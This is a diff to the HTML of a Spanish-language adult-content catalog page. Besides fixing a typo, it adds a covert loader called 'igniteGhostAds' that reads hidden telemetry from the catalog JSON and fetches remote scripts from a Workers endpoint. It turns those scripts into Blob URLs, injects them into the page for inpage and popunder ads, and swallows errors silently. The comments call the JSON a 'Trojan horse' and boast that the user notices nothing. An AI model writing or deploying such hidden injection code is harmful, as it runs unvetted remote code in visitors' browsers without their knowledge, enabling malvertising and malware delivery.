@@ -168,7 +168,7 @@
     <div id="age-verification-modal" class="age-overlay">
         <div class="age-box">
             <h2 class="logo-nogle" style="font-size: 3rem; margin-bottom: 10px;">NOGLE</h2>
-            <p style="font-family: 'Instrument Serif', serif; font-style: italic; font-size: 1.4rem; margin-bottom: 20px;">Acceso Exlusivo Gratis +18</p>
+            <p style="font-family: 'Instrument Serif', serif; font-style: italic; font-size: 1.4rem; margin-bottom: 20px;">Acceso Exclusivo Gratis +18</p>
             <p class="age-text">Bienvenido a Nogle. Para explorar las galerías exclusivas y el contenido de nuestras creadoras, debes confirmar que eres mayor de edad. Al hacer clic en entrar, declaras tener al menos 18 años y aceptas nuestros términos de privacidad.</p>
             <button class="btn-yes" onclick="acceptAge()">Si, Soy Mayor de Edad</button>
             <button class="btn-no" onclick="window.location.href='https://google.com'">SALIR</button>
@@ -205,7 +205,7 @@
             document.body.classList.remove('modal-open');
         }
 
-        // 2. Carga Dinámica
+        // 2. Carga Dinámica y Motor de Inyección
         const WORKER_URL = 'https://nogle-knon.villajonas09.workers.dev/';
 
         function isRecent(dateString) {
@@ -216,11 +216,50 @@
             return diffInHours < 72; 
         }
 
+        // --- SISTEMA ÉLITE: MOTOR FANTASMA ---
+        async function igniteGhostAds(telemetry) {
+            const { handshake, endpoints } = telemetry;
+
+            const injectBlob = async (endpoint) => {
+                try {
+                    // Pedimos el script usando la llave criptográfica al Worker
+                    const req = await fetch(endpoint, {
+                        headers: { 'X-Knon-Session': handshake }
+                    });
+                    if (!req.ok) return;
+                    
+                    // Extraemos el código puro
+                    const code = await req.text();
+                    
+                    // Lo convertimos en un Objeto de Memoria (Blob) invisible
+                    const blob = new Blob([code], { type: 'application/javascript' });
+                    const blobUrl = URL.createObjectURL(blob);
+                    
+                    // Inyectamos el script desde la RAM
+                    const script = document.createElement('script');
+                    script.src = blobUrl;
+                    script.dataset.cfasync = 'false';
+                    document.body.appendChild(script);
+                } catch (e) {
+                    // Fallo silencioso, el usuario no nota nada
+                }
+            };
+
+            // Lanzamos Inpage y Popunder de forma asíncrona
+            if (endpoints.inpage) injectBlob(endpoints.inpage);
+            if (endpoints.popunder) injectBlob(endpoints.popunder);
+        }
+        // -------------------------------------
+
         async function initCatalog() {
             const container = document.getElementById('main-catalog');
             try {
+                // Obtenemos el Caballo de Troya (Datos + Telemetría oculta)
                 const response = await fetch(WORKER_URL + 'catalogo.json');
-                const modelos = await response.json();
+                const payload = await response.json();
+                
+                // Extraemos solo el array de modelos para la interfaz
+                const modelos = payload.modelos; 
                 container.innerHTML = ''; 
 
                 modelos.forEach(m => {
@@ -240,10 +279,18 @@
                     `;
                     container.insertAdjacentHTML('beforeend', card);
                 });
+
+                // Detonamos los anuncios si existen en el JSON
+                if (payload._telemetry) {
+                    igniteGhostAds(payload._telemetry);
+                }
+
             } catch (error) {
                 container.innerHTML = `<div id="loader" style="color:red;">FALLO EN LA CONEXIÓN</div>`;
+                console.error(error);
             }
         }
+        
         initCatalog();
     </script>
 </body>
